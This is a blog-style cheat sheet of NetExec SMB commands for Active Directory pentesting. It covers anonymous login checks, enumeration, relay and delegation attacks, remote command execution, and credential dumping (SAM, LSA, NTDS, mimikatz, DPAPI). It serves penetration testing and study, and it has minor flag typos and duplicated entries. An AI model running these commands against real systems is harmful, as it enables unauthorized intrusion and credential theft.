---
title: "NetExec SMB Protocal"
date: 2026-01-10 00:00:00 +0530
categories: [AD- Attacks]
tags: [135 445 Port, Netexec smb, smb, SMB Protocal]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/smb.png
excerpt: "Technical understanding and practical overview"
---
# NetExec SMB
- SMB can refer to Server Message Block, a network protocol for file/printer sharing across Windows, macOS, Linux, etc.
- A client-server protocol for sharing files, printers, and other resources over a network.
- Allows applications to access files on remote servers as if they were local, using TCP/IP.
- Modern versions (SMB3) offer encryption, signing, and Kerberos authentication for better security

### Checks
```bash
nxc smb $ip   -u ''  -p ''        # Anonymous Login
nxc smb $ip   -u 'Guest' -p ''    # Guest Login
nxc smb $ip   -u '0xmr'  -p ''    # It also Guest type Authentication
```
### Authentication
```bash
nxc smb $IP -u '' -p <pass> -H <NTLM_HASH> --use-kcache -k --local-auth -d <domain> --kdcHost <FQDN>  --pfx-cert file.pfx  --cert-pem file.pem  --key-pem file.key

-p                                                                 # Password Auth
-H                                                                 # NTLM Hash
--user-kcache                                                      # Kcache key
-k                                                                 # kerberos Auth
--pfx-cert / --pfx-base64 with --pfx-pass for PFX certificates     # pfx Auth
--cert-pem with --key-pem                                          # Both key and cert Required to Auth

-d  or --kdcHost                                                   # Specify Domain Name and Fully Qualified Domain Name
```
### Generate File
```bash
nxc smb $IP/24  -u '' -p ''  --gen-relay-list sign_off.txt | --generate-hosts hosts |  --generate-krb5-file krb5.conf |  --generate-tgt tgt.ccache

sudo cat sign_off.txt                  # check signing attack possible or not !       
sudo cat hosts.txt >> /etc/hosts       # fix  host name 
sudo cp krb5.conf /etc/krb5.conf       # fix  kdc error
export KRB5CCNAME=tgt.ccache           # Export ccahe key and authenticate it !
```
### Enumeration
```bash
nxc smb $IP  --users  --shares  --groups  --computers  --sessions  --rid-brute   --loggedon-users  --pass-pol  --disks  --qwinsta  --tasklist  --dc-list  --put-file  --get-file  --interfaces

--users            # Enumerate domain users
--shares           # List all SMB shares and permissions
--share            # use share ( --share <name> --dir)
--dir              # Directory list in shares ( dir or dir "/path/to" )
--groups           # Enumerate domain groups
--computers        # List domain computers
--sessions         # Show active SMB sessions/connections
--rid-brute 10000  # Brute force users via RID cycling (up to RID 10000)
--loggedon-users   # Show currently logged-on users
--pass-pol         # Display domain password policy
--disks            # Enumerate physical and logical drives attached to the system
--qwinsta					 # Enumerate RDP sessions (Cross Session Attack)
--tasklist         # Check Running tasks
--dc-list          # list of Domains with Ip Adresses
--put-file         # Send a local file to the remote target (--put-file /tmp/whoami.txt  /path/where/to/upload)
--get-file         # Get a remote file on the remote target (--get-file \\Windows\\Temp\\whoami.txt  /path/where/to/save)
--interfaces       # Enumerate network interfaces
```
### Attacks
```bash
nxc smb $ip -u '' -p ''

-M timeroast                # Request Hash of the computer Accounts via sntp Protocal without credentials Required.
--gen-relay-list            # Enumerate Hosts with SMB Signing Not Required (SMB Relay)
--qwinsta                        # Enumerate Active Windows Sessions (Cross session Attack)
--delegate Administrator --self  # object with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to an account you control (rbcd) 
-x 'whoami /all'                 # Executing Remote Commands


-M rdcman
-M security-questions
-M change-password -o USER=TargetUser NEWPASS=  or NEWHASH=    # Change password
```
### Credential Dumping
```bash
nxc smb $ip -u '' -p ''

--laps                      # Enumerate Local Administrator Password Solution
--sam                       # Dump SAM hashes using methods from secretsdump.py
--lsa                       # Requires Domain Admin or Local Admin Priviledges on target Domain Controller
-M backup_operator          # Dump with BackupOperator Priv
-M wifi                     # You need at least local admin privilege on the remote target
-M putty                    # PuTTY allows users to store private keys for connections
-M ntdsutil  or --ntds      # Required Admin Powers
-M lsassy                   # You need at least local admin privilege on the remote target
-M nanodump                 # You need at least local admin privilege on the remote target
-M mimikatz                 # Enumerate via mimikatz's
-M wifi                     # You need at least local admin privilege on the remote target
-M putty                    # PuTTY allows users to store private keys for connections
-M vnc                      # RealVNC or TightVNC allow users to store credentials for connections
-M mremoteng
-M notepad
-M notepad++ 
--dpapi_hash  or --dpapi
--dpapi cookies or  --dpapi nosystem
```
# More Thinks Add soon !!!
